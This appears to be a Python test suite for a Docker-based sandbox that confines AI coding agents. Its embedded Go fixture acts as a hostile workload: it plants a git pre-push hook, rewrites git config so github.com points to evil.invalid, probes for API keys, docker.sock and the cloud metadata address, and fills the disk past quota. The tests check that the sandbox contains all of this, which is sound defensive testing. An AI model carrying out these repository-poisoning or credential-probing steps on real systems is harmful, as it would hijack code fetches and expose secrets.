from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
import uuid
from dataclasses import replace
from pathlib import Path
from unittest.mock import patch

from hermes_steward.execution_isolation import (
    ContainerProviderRunner,
    ContainmentPolicy,
    DockerContainerJobRunner,
    DockerNetworkAttestor,
    GatewayNetworkBinding,
    execution_container_name,
)
from test_execution_adapters import profile, request_for
from hermes_steward.contracts import fingerprint


GO_RUNTIME = r'''
package main

import (
    "archive/tar"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "os"
    "path/filepath"
    "strconv"
    "strings"
    "time"
)

func importTree() error {
    reader := tar.NewReader(os.Stdin)
    for {
        header, err := reader.Next()
        if err == io.EOF { return nil }
        if err != nil { return err }
        clean := filepath.Clean(header.Name)
        if filepath.IsAbs(clean) || clean == ".." || strings.HasPrefix(clean, "../") { return fmt.Errorf("unsafe archive path") }
        target := filepath.Join("/workspace", clean)
        relative, err := filepath.Rel("/workspace", target)
        if err != nil || relative == ".." || strings.HasPrefix(relative, "../") { return fmt.Errorf("archive escape") }
        switch header.Typeflag {
        case tar.TypeDir:
            if err := os.MkdirAll(target, 0700); err != nil { return err }
        case tar.TypeReg, tar.TypeRegA:
            if err := os.MkdirAll(filepath.Dir(target), 0700); err != nil { return err }
            output, err := os.OpenFile(target, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0600); if err != nil { return err }
            if _, err = io.Copy(output, reader); err != nil { output.Close(); return err }
            if err = output.Close(); err != nil { return err }
        case tar.TypeSymlink:
            if filepath.IsAbs(header.Linkname) || strings.Contains(filepath.Clean(header.Linkname), "..") { return fmt.Errorf("unsafe symlink") }
            if err := os.Symlink(header.Linkname, target); err != nil { return err }
        default:
            return fmt.Errorf("unsupported archive entry")
        }
    }
}

func exportTree() error {
    writer := tar.NewWriter(os.Stdout)
    defer writer.Close()
    return filepath.Walk("/workspace", func(path string, info os.FileInfo, err error) error {
        if err != nil { return err }
        relative, err := filepath.Rel("/workspace", path); if err != nil { return err }
        link := ""
        if info.Mode()&os.ModeSymlink != 0 {
            link, err = os.Readlink(path); if err != nil { return err }
        }
        header, err := tar.FileInfoHeader(info, link); if err != nil { return err }
        header.Name = filepath.ToSlash(relative)
        if err = writer.WriteHeader(header); err != nil { return err }
        if !info.Mode().IsRegular() { return nil }
        input, err := os.Open(path); if err != nil { return err }
        _, copyErr := io.Copy(writer, input)
        closeErr := input.Close()
        if copyErr != nil { return copyErr }
        return closeErr
    })
}

func copyTree(source, target string) error {
    return filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
        if err != nil { return err }
        relative, err := filepath.Rel(source, path); if err != nil { return err }
        destination := filepath.Join(target, relative)
        if info.IsDir() { return os.MkdirAll(destination, 0700) }
        if info.Mode()&os.ModeSymlink != 0 {
            link, err := os.Readlink(path); if err != nil { return err }
            return os.Symlink(link, destination)
        }
        input, err := os.Open(path); if err != nil { return err }; defer input.Close()
        output, err := os.OpenFile(destination, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0600); if err != nil { return err }
        _, copyErr := io.Copy(output, input); closeErr := output.Close()
        if copyErr != nil { return copyErr }; return closeErr
    })
}

func gateway() {
    listener, err := net.Listen("tcp", "0.0.0.0:8443"); if err != nil { panic(err) }
    for { connection, err := listener.Accept(); if err == nil { connection.Write([]byte("gateway-ok")); connection.Close() } }
}

func reachable(address string) bool {
    connection, err := net.DialTimeout("tcp", address, 500*time.Millisecond)
    if err != nil { return false }
    connection.Close(); return true
}

func execute(args []string) {
    decoded, err := base64.StdEncoding.DecodeString(os.Getenv("EXEC_REQUEST_B64")); if err != nil { panic(err) }
    var request map[string]interface{}; if json.Unmarshal(decoded, &request) != nil { panic("request unreadable") }
    mode := "synthetic"
    for _, argument := range args { if argument == "quota-over" { mode = argument } }
    if mode == "quota-over" {
        limit, _ := strconv.Atoi(os.Getenv("EXEC_WORKSPACE_LIMIT_BYTES"))
        file, err := os.Create("/workspace/overflow.bin"); if err != nil { panic(err) }
        block := make([]byte, 1024*1024)
        for written := 0; written < limit+2*1024*1024; written += len(block) {
            if _, err = file.Write(block); err != nil {
                fmt.Fprintln(os.Stderr, "no space left on device")
                os.Exit(23)
            }
        }
        file.Close(); os.Exit(24)
    }
    target := "/workspace/hermes-build-steward/runtime-probe.txt"
    os.MkdirAll(filepath.Dir(target), 0700)
    if os.WriteFile(target, []byte("modified by uid 65532\n"), 0600) != nil { panic("workspace not writable") }
    os.MkdirAll("/workspace/.git/hooks", 0700)
    os.WriteFile("/workspace/.git/hooks/pre-push", []byte("#!/bin/sh\necho hostile\n"), 0700)
    config, _ := os.OpenFile("/workspace/.git/config", os.O_APPEND|os.O_WRONLY, 0600)
    if config != nil { config.WriteString("\n[url \"https://evil.invalid/\"]\n\tinsteadOf = https://github.com/\n"); config.Close() }
    prohibitedEnv := []string{"OPENAI_API_KEY","CODEX_API_KEY","ANTHROPIC_API_KEY","GITHUB_TOKEN","HERMES_PFX","HERMES_GRAPH_TOKEN","HERMES_STATE_CREDENTIAL","COORDINATOR_SECRET"}
    credentialsDenied := true
    for _, key := range prohibitedEnv { if os.Getenv(key) != "" { credentialsDenied = false } }
    outsideDenied := true
    for _, path := range []string{"/outside-host-sentinel", "/var/run/docker.sock", "/etc/sandiva-hermes"} {
        if _, err := os.Stat(path); err == nil { outsideDenied = false }
    }
    direct := []string{"1.1.1.1:80", "169.254.169.254:80", "10.0.0.1:443", "graph.microsoft.com:443", "example.com:443"}
    directDenied := true
    for _, endpoint := range direct { if reachable(endpoint) { directDenied = false } }
    result := map[string]interface{}{
        "status":"completed", "started_at":"2026-09-06T10:00:00Z", "completed_at":"2026-09-06T10:00:01Z",
        "commands":[]string{}, "tests":[]map[string]interface{}{{"name":"runtime-network", "status":"PASS", "command":"synthetic"}},
        "changed_paths":[]string{"hermes-build-steward/runtime-probe.txt"}, "patch_digest":strings.Repeat("1",64), "log_refs":[]string{},
        "runtime_probes":map[string]bool{
            "uid65532": os.Getuid() == 65532, "requestReadable": request["taskId"] != nil,
            "workspaceWritable": true, "outsideDenied": outsideDenied, "credentialsDenied": credentialsDenied,
            "gatewayReachable": reachable("executor-gateway.sandiva.internal:8443"), "directEgressDenied": directDenied,
        },
    }
    encoded, _ := json.Marshal(result); fmt.Println(string(encoded))
}

func main() {
    if len(os.Args) < 2 { os.Exit(2) }
    switch os.Args[1] {
    case "sleep": for { time.Sleep(time.Hour) }
    case "gateway": gateway()
    case "import": if err := importTree(); err != nil { panic(err) }
    case "export": if err := exportTree(); err != nil { panic(err) }
    case "execute":
        args := os.Args[2:]; if len(args) > 0 && args[0] == "--" { args = args[1:] }; execute(args)
    default: os.Exit(3)
    }
}
'''


@unittest.skipUnless(sys.platform.startswith("linux") and shutil.which("docker"), "requires Linux with Docker")
class Exec01DockerRuntimeTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not shutil.which("go"):
            raise unittest.SkipTest("requires Go to build the scratch runtime fixture")
        cls.temp = tempfile.TemporaryDirectory()
        root = Path(cls.temp.name)
        (root / "main.go").write_text(GO_RUNTIME, encoding="utf-8")
        env = {**os.environ, "CGO_ENABLED": "0", "GOOS": "linux", "GOARCH": "amd64"}
        subprocess.run(["go", "build", "-trimpath", "-ldflags=-s -w", "-o", root / "exec01-runtime", root / "main.go"], check=True, env=env)
        (root / "Dockerfile").write_text(
            "FROM scratch\nCOPY --chmod=0555 exec01-runtime /opt/sandiva/bin/exec01-runtime\nENTRYPOINT [\"/opt/sandiva/bin/exec01-runtime\"]\n",
            encoding="utf-8",
        )
        cls.image = subprocess.check_output(["docker", "build", "-q", str(root)], text=True).strip()
        if not cls.image.startswith("sha256:"):
            raise RuntimeError("Docker fixture image is not content-addressed")

    @classmethod
    def tearDownClass(cls):
        subprocess.run(["docker", "image", "rm", "-f", cls.image], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cls.temp.cleanup()

    def setUp(self):
        suffix = uuid.uuid4().hex[:12]
        self.network = f"exec01-internal-{suffix}"
        self.gateway = f"exec01-gateway-{suffix}"
        self.policy_fingerprint = fingerprint({
            "networkName": self.network,
            "allowedEndpoints": ["executor-gateway.sandiva.internal:8443"],
            "topology": "internal-network-single-attested-gateway-v1",
        })
        subprocess.run(["docker", "network", "create", "--internal", self.network], check=True, stdout=subprocess.DEVNULL)
        subprocess.run([
            "docker", "run", "-d", "--name", self.gateway, "--network", self.network,
            "--network-alias", "executor-gateway.sandiva.internal",
            "--env", "PROVIDER_CREDENTIAL=PROVIDER-GATEWAY-SENTINEL",
            "--label", f"sandiva.exec.gateway-policy={self.policy_fingerprint}", self.image, "gateway",
        ], check=True, stdout=subprocess.DEVNULL)
        self.root = Path(self.temp.name) / suffix
        self.workspace = self.root / "workspace"
        (self.workspace / "hermes-build-steward").mkdir(parents=True)
        (self.workspace / "hermes-build-steward" / "README.md").write_text("seed\n", encoding="utf-8")
        subprocess.run(["git", "init", "-q", str(self.workspace)], check=True)
        subprocess.run(["git", "-C", str(self.workspace), "add", "hermes-build-steward/README.md"], check=True)
        subprocess.run([
            "git", "-C", str(self.workspace), "-c", "user.email=test@sandiva.invalid",
            "-c", "user.name=Sandiva Test", "commit", "-q", "-m", "base",
        ], check=True)
        self.original_git_config = (self.workspace / ".git" / "config").read_bytes()

    def tearDown(self):
        subprocess.run(["docker", "rm", "-f", self.gateway], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["docker", "network", "rm", self.network], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        shutil.rmtree(self.root, ignore_errors=True)

    def _invoke(self, mode="synthetic", workspace_limit=16 * 1024 * 1024):
        base_profile = profile("codex")
        executor_profile = replace(
            base_profile, image=self.image,
            fixed_argv=("codex", mode, "--model", base_profile.model),
            allowed_endpoints=("executor-gateway.sandiva.internal:8443",),
        )
        request = request_for(executor_profile)
        policy = ContainmentPolicy(
            cpu_limit="1.0", memory_limit="128m", pids_limit=32,
            workspace_limit_bytes=workspace_limit, wall_time_seconds=20,
            output_limit_bytes=65536, network_name=self.network,
            allowed_endpoints=executor_profile.allowed_endpoints,
        )
        binding = GatewayNetworkBinding(self.network, self.gateway, self.image, self.policy_fingerprint)
        job = DockerContainerJobRunner(policy, network_attestor=DockerNetworkAttestor(binding))
        return ContainerProviderRunner(policy, self.root / "requests", runner=job).invoke(
            executor_profile, request, self.workspace.as_posix()
        )

    def test_r2_non_root_container_reads_request_writes_only_tmpfs_workspace_and_leaves_no_broad_permission(self):
        sentinels = {
            "OPENAI_API_KEY": "OPENAI-HOST-SENTINEL",
            "ANTHROPIC_API_KEY": "ANTHROPIC-HOST-SENTINEL",
            "SANDIVA_GITHUB_PUBLISHER_TOKEN": "PUBLISHER-HOST-SENTINEL",
            "HERMES_PFX": "PFX-HOST-SENTINEL",
            "HERMES_GRAPH_TOKEN": "GRAPH-HOST-SENTINEL",
            "HERMES_STATE_CREDENTIAL": "STATE-HOST-SENTINEL",
            "COORDINATOR_SECRET": "COORDINATOR-HOST-SENTINEL",
        }
        with patch.dict(os.environ, sentinels):
            result = self._invoke()
        probes = result["runtime_probes"]
        self.assertTrue(all(probes[name] for name in ("uid65532", "requestReadable", "workspaceWritable", "outsideDenied", "credentialsDenied")))
        self.assertEqual((self.workspace / "hermes-build-steward" / "runtime-probe.txt").read_text(), "modified by uid 65532\n")
        self.assertEqual(stat.S_IMODE(self.workspace.stat().st_mode) & 0o022, 0)
        self.assertFalse((self.root / "requests").exists())
        self.assertEqual((self.workspace / ".git" / "config").read_bytes(), self.original_git_config)
        self.assertFalse((self.workspace / ".git" / "hooks" / "pre-push").exists())
        observed = json.dumps(result) + "".join(
            path.read_text(encoding="utf-8", errors="ignore")
            for path in self.workspace.rglob("*") if path.is_file()
        )
        for sentinel in (*sentinels.values(), "PROVIDER-GATEWAY-SENTINEL"):
            self.assertNotIn(sentinel, observed)

    def test_r3_bounded_tmpfs_stops_over_limit_write_and_does_not_expand_host_workspace(self):
        before = sum(path.stat().st_size for path in self.workspace.rglob("*") if path.is_file())
        result = self._invoke("quota-over", workspace_limit=8 * 1024 * 1024)
        after = sum(path.stat().st_size for path in self.workspace.rglob("*") if path.is_file())
        self.assertEqual(result["status"], "failed")
        self.assertEqual(result["error_type"], "resource_limit")
        self.assertEqual(after, before)
        self.assertFalse(any(path.name.endswith("container-export") for path in self.root.iterdir()))

    def test_r4_internal_network_allows_exact_gateway_but_denies_direct_egress(self):
        probes = self._invoke()["runtime_probes"]
        self.assertTrue(probes["gatewayReachable"])
        self.assertTrue(probes["directEgressDenied"])

    def test_r3_cancellation_force_removes_task_container_and_descendants(self):
        request = request_for(profile("codex"))
        container_name = execution_container_name(request)
        subprocess.run([
            "docker", "run", "-d", "--name", container_name, self.image, "sleep", "infinity",
        ], check=True, stdout=subprocess.DEVNULL)
        policy = ContainmentPolicy(
            cpu_limit="1.0", memory_limit="128m", pids_limit=32,
            workspace_limit_bytes=16 * 1024 * 1024, wall_time_seconds=20,
            output_limit_bytes=65536, network_name=self.network,
            allowed_endpoints=("executor-gateway.sandiva.internal:8443",),
        )
        DockerContainerJobRunner(policy).cancel(request)
        observed = subprocess.run(
            ["docker", "inspect", container_name], check=False,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self.assertNotEqual(observed.returncode, 0)


if __name__ == "__main__":
    unittest.main()
